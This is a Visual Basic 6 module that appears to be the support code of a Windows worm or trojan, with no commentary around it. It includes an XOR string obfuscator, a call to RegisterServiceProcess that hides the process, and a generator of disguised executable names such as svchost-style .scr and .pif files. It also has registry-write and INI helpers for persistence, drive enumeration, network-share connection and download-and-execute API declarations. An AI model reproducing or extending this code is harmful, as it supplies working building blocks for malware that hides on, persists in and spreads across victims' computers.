   Attribute VB_Name = "GedMod"
   Public Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
   Private Declare Function GetLongPathName Lib "kernel32" Alias "GetLongPathNameA" (ByVal lpszShortPath As String, ByVal lpszLongPath As String, ByVal cchBuffer As Long) As Long

   Public Const MAX_PATH = 256
   Public Declare Function FindFirstFile Lib "kernel32" Alias "FindFirstFileA" (ByVal lpFileName As String, lpFindFileData As WIN32_FIND_DATA) As Long
   Public Declare Function FindNextFile Lib "kernel32" Alias "FindNextFileA" (ByVal hFind As Long, lpFindFileData As WIN32_FIND_DATA) As Long
   Public Declare Function FindClose Lib "kernel32" (ByVal hFindFile As Long) As Long

   Public Type FILETIME
       dwLowDateTime As Long
       dwHighDateTime As Long
   End Type

   Public Type WIN32_FIND_DATA
       dwFileAttributes As Long
       ftCreationTime As FILETIME
       ftLastAccessTime As FILETIME
       ftLastWriteTime As FILETIME
       nFileSizeHigh As Long
       nFileSizeLow As Long
       dwReserved0 As Long
       dwReserved1 As Long
       cFileName As String * MAX_PATH
       cAlternate As String * 14
   End Type

   Public Declare Function WNetAddConnection2 Lib "mpr.dll" Alias "WNetAddConnection2A" (lpNetResource As NETRESOURCE, ByVal lpPassword As String, ByVal lpUserName As String, ByVal dwFlags As Long) As Long
   Public Declare Function WNetCancelConnection2 Lib "mpr.dll" Alias "WNetCancelConnection2A" (ByVal lpName As String, ByVal dwFlags As Long, ByVal fForce As Long) As Long

   Public Type NETRESOURCE
     dwScope As Long
     dwType As Long
     dwDisplayType As Long
     dwUsage As Long
     lpLocalName As String
     lpRemoteName As String
     lpComment As String
     lpProvider As String
   End Type

   Public Const RESOURCETYPE_DISK = &H1
   Public Const CONNECT_UPDATE_PROFILE = &H1

   Private Declare Function GetLogicalDrives Lib "kernel32" () As Long
   Private Declare Function GetDriveType Lib "kernel32" Alias "GetDriveTypeA" (ByVal nDrive As String) As Long
   Public Declare Function GetDiskFreeSpace Lib "kernel32" Alias "GetDiskFreeSpaceA" (ByVal lpRootPathName As String, lpSectorsPerCluster As Long, lpBytesPerSector As Long, lpNumberOfFreeClusters As Long, lpTotalNumberOfClusters As Long) As Long

   Private Declare Function GetSystemDefaultLangID Lib "kernel32" () As Integer

   Private Declare Function GetLocaleInfo Lib "kernel32" Alias "GetLocaleInfoA" (ByVal Locale As Long, ByVal LCType As Long, ByVal lpLCData As String, ByVal cchData As Long) As Long

   Public Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
   Public Const SW_NORMAL = 1

   Private Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long

   Private Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
   Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
   Private Declare Function GetTempPath Lib "kernel32" Alias "GetTempPathA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long

   Private Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
   Private Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long
   Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
   Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long
   Private Declare Function RegCreateKeyEx Lib "advapi32.dll" Alias "RegCreateKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal Reserved As Long, ByVal lpClass As String, ByVal dwOptions As Long, ByVal samDesired As Long, ByVal lpSecurityAttributes As Long, phkResult As Long, lpdwDisposition As Long) As Long
   Private Declare Function RegDeleteValue Lib "advapi32.dll" Alias "RegDeleteValueA" (ByVal hKey As Long, ByVal lpValueName As String) As Long

   Private Const REG_SZ = 1
   Private Const REG_DWORD = 4

   Private Const KEY_ALL_ACCESS = &H3F
   Private Const REG_OPTION_NON_VOLATILE = 0

   Private Const HKEY_CLASSES_ROOT As Long = &H80000000
   Private Const HKEY_CURRENT_USER As Long = &H80000001
   Private Const HKEY_LOCAL_MACHINE As Long = &H80000002

   Private Const KEY_QUERY_VALUE As Long = &H1

   Private Declare Function GetCurrentProcessId Lib "kernel32" () As Long
   Private Declare Function RegisterServiceProcess Lib "kernel32" (ByVal dwProcessId As Long, ByVal dwType As Long) As Long

   Private Declare Function GetVersionExA Lib "kernel32" (lpVersionInformation As OSVERSIONINFO) As Integer

   Private Type OSVERSIONINFO
     dwOSVersionInfoSize As Long
     dwMajorVersion As Long
     dwMinorVersion As Long
     dwBuildNumber As Long
     dwPlatformId As Long
     szCSDVersion As String * 128
   End Type

   Public K1 As String, K2 As String, K3 As String

   Public Function q(j) As String
   On Error Resume Next: For r = 1 To Len(j): q = q & Chr(Asc(Mid(j, r, 1)) Xor 7): Next
   End Function

   Public Function Flx(Path) As Boolean
   On Error Resume Next
   If Len(Path) < 4 Then Flx = False: Exit Function
   Flx = IIf(Dir(Path, vbArchive + vbHidden + vbNormal + vbReadOnly + vbSystem) <> "", True, False)
   End Function

   Public Function Fdx(Path) As Boolean
   On Error Resume Next
   If Len(Path) = 0 Then Fdx = False: Exit Function
   If Right(Path, 1) <> "\" Then Path = Path & "\"
   Fdx = IIf(Dir(Path, vbDirectory + vbNormal + vbReadOnly + vbSystem) <> "", True, False)
   End Function

   Function Sp(x As Integer)
   On Error Resume Next
   Dim l As Long, spath As String

   Select Case x

   Case 0
   spath = Space$(255): l = GetWindowsDirectory(spath, 255): Sp = Left(spath, l)

   Case 1
   spath = Space$(255): l = GetSystemDirectory(spath, 255): Sp = Left(spath, l)

   Case 2
   spath = Space$(255): l = GetTempPath(255, spath): Sp = Left(spath, l - 1)

   Case 3
   spath = App.Path
   If Right(spath, 1) <> "\" Then spath = spath & "\"
   Ex = Array(".exe", ".scr", ".pif", ".com", ".bat")
   For i = 0 To UBound(Ex)
   If Flx(spath & App.EXEName & Ex(i)) Then
   Sp = glp(spath & App.EXEName & Ex(i))
   Exit For
   End If
   Next

   End Select
   End Function

   Public Function RndName() As String
   On Error Resume Next
   Dim RI(4) As Integer

   pre = Array("win", "acc", "asd", "un", "char", "cvt", "reg", _
   "serv", "clip", "cd", "dos", "free", "micro", "grp", "hw", _
   "ip", "is", "net", "xp", "w2k")

   bod = Array("command", "load", "rundl", "setup", "install", _
   "calc", "defrag", "aplog", "clean", "player", "explorer", _
   "view", "extrat", "ftp", "groups", "mixer", "Uninst", "route", _
   "svchost", "twtour")

   suf = Array("32", "upd", "stat", "arp", "38", "map", "brd", _
   "rep", "drv", "386", "info", "config", "040a", "img", "503", _
   "mon", "set", "lib", "dll", "unst")

   est = Array(".exe", ".com", ".pif", ".bat", ".scr")

   Randomize
   RI(0) = Int(Rnd * 20): RI(1) = Int(Rnd * 20): RI(2) = Int(Rnd * 20): RI(3) = Int(Rnd * 5)

   RndName = UCase(pre(RI(0)) & bod(RI(2)) & suf(RI(1)) & est(RI(3)))
   End Function

   Public Sub SA(P, a As Integer)
   On Error Resume Next: SetAttr P, a
   End Sub

   Public Sub Rw(sKey, nKey, vKey As Variant, m0, m1)
   On Error Resume Next
   Dim RK As Long, l As Long, hKey As Long

   Select Case m0
   Case 1
   RK = HKEY_CLASSES_ROOT
   Case 2
   RK = HKEY_CURRENT_USER
   Case 3
   RK = HKEY_LOCAL_MACHINE
   End Select

   l = RegCreateKeyEx(RK, sKey, 0&, vbNullString, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0&, hKey, l)

   Select Case m1
   Case 1
   Dim sVal As String
    sVal = vKey
    l = RegSetValueEx(hKey, nKey, 0&, REG_SZ, ByVal sVal, Len(sVal) + 1)
   Case 2
   Dim lVal As Long
   lVal = vKey
    l = RegSetValueEx(hKey, nKey, 0&, REG_DWORD, ByVal lVal, 4)
   End Select

   l = RegCloseKey(hKey)
   End Sub

   Public Sub Rd(sKey, nKey, m)
   On Error Resume Next

   Dim RK As Long, l As Long, hKey As Long

   Select Case m
   Case 1
   RK = HKEY_CLASSES_ROOT
   Case 2
   RK = HKEY_CURRENT_USER
   Case 3
   RK = HKEY_LOCAL_MACHINE
   End Select

   l = RegOpenKeyEx(RK, sKey, 0, KEY_ALL_ACCESS, hKey)
    l = RegDeleteValue(hKey, nKey)
   l = RegCloseKey(hKey)
   End Sub

   Public Function Rr(sKey, nKey, m)
   On Error Resume Next
   Dim RK As Long, l As Long, hKey As Long, ky As Long, fKey As String

   Select Case m
   Case 1
   RK = HKEY_CLASSES_ROOT
   Case 2
   RK = HKEY_CURRENT_USER
   Case 3
   RK = HKEY_LOCAL_MACHINE
   End Select

   l = RegOpenKeyEx(RK, sKey, 0, KEY_QUERY_VALUE, hKey)

     l = RegQueryValueEx(hKey, nKey, 0&, REG_SZ, 0&, ky)

   fKey = String(ky, Chr(32))

   If l <= 2 Then Rr = "Err": Exit Function

     l = RegQueryValueEx(hKey, nKey, 0&, REG_SZ, ByVal fKey, ky)

   fKey = Left$(fKey, ky - 1)

   l = RegCloseKey(hKey)

   Rr = fKey
   End Function

   Public Sub WIni(I_S As String, IK As String, IV As String, ip As String)
   On Error Resume Next: Dim Wn As Long
   Wn = WritePrivateProfileString(I_S, IK, IV, ip)
   End Sub

   Public Function GetWinVersion() As Long
   On Error Resume Next
   Dim OSinfo As OSVERSIONINFO
       With OSinfo
           .dwOSVersionInfoSize = 148
           .szCSDVersion = Space$(128)
           Call GetVersionExA(OSinfo)
        GetWinVersion = .dwPlatformId
       End With
   End Function

   Public Sub SubProces()
   On Error Resume Next: Call RegisterServiceProcess(GetCurrentProcessId(), 1)
   End Sub

   Public Function LangID() As String
   On Error Resume Next
   Dim sBuf As String * 255, l As Long
   LCID = GetSystemDefaultLangID()
   l = GetLocaleInfo(LCID, &H4, sBuf, Len(sBuf))
   LangID = Left(sBuf, l)
   End Function

   Public Function EnDisck(a)
   On Error Resume Next
   Dim mdk() As String, i As Integer, x As Integer, l As Long

   l = GetLogicalDrives()

   If l = False Then Exit Function

   For i = 0 To 25
    If (l And 2 ^ i) Then

     If GetDriveType(Chr(i + 65) & ":\") = a Then
     x = x + 1: ReDim Preserve mdk(1 To x): mdk(x) = Chr(i + 65) & ":\"
     End If

    End If
   Next

   EnDisck = mdk
   End Function

   Private Function glp(pat)
   On Error Resume Next
   Dim sBuf As String, l As Long
   sBuf = Space$(260)
   l = GetLongPathName(pat, sBuf, Len(sBuf))
   glp = Left$(sBuf, l)
   End Function
